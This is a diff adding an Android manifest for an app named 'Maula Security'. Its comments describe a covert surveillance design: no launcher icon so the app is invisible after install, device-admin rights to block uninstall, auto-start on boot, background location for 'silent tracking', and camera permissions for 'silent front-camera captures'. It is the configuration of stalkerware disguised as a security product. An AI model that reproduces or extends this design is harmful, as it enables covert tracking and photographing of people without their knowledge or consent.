@@ -1,0 +1,107 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+    Maula Security Android Manifest
+
+    Key difference from a normal app:
+    - NO <category android:name="android.intent.category.LAUNCHER" /> in the main activity
+      → The app will NOT appear in the app drawer / home screen after install.
+    - RECEIVE_BOOT_COMPLETED → Starts automatically when device boots.
+    - Device Administrator privileges → Prevents easy uninstall.
+    - Background location, camera, and network permissions for silent collection.
+-->
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="ai.maula.security">
+
+    <!-- ── Permissions ────────────────────────────────────────────────────── -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+
+    <!-- GPS — coarse for network-based, fine for GPS chip -->
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <!-- Background location (Android 10+) — required for silent tracking -->
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+
+    <!-- Camera — for silent front-camera captures -->
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-feature android:name="android.hardware.camera" android:required="false" />
+    <uses-feature android:name="android.hardware.camera.front" android:required="false" />
+
+    <!-- Foreground service — required on Android 8+ to survive background -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+
+    <!-- Boot receiver — restarts agent after device reboot -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <!-- Wake lock — prevent CPU sleep during data transmission -->
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+
+    <!-- Read phone state — SIM hash for SIM-swap detection -->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+
+    <!-- Device admin — prevents uninstall without admin revocation -->
+    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN"
+        android:protectionLevel="signature" />
+
+    <application
+        android:allowBackup="false"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:theme="@style/AppTheme"
+        android:usesCleartextTraffic="false">
+
+        <!-- ── Main Activity ──────────────────────────────────────────── -->
+        <!-- No LAUNCHER category → app is invisible to user after install -->
+        <activity
+            android:name=".MainActivity"
+            android:configChanges="orientation|keyboardHidden|keyboard|screenSize|locale|smallestScreenSize|screenLayout|uiMode"
+            android:exported="true"
+            android:launchMode="singleTask"
+            android:theme="@style/AppTheme.NoActionBar">
+            <intent-filter>
+                <!-- Main entry point — but NO LAUNCHER, so no app drawer icon -->
+                <action android:name="android.intent.action.MAIN" />
+                <!-- Intentionally omitting LAUNCHER category -->
+            </intent-filter>
+        </activity>
+
+        <!-- ── Boot Receiver — auto-starts after reboot ────────────────── -->
+        <receiver
+            android:name=".BootReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <!-- HTC devices -->
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ── Device Admin Receiver — prevents uninstall ──────────────── -->
+        <receiver
+            android:name=".DeviceAdminReceiver"
+            android:exported="true"
+            android:label="Maula Security"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_policies" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ── Background Service ────────────────────────────────────────── -->
+        <service
+            android:name=".SecurityService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="location|camera" />
+
+    </application>
+</manifest>
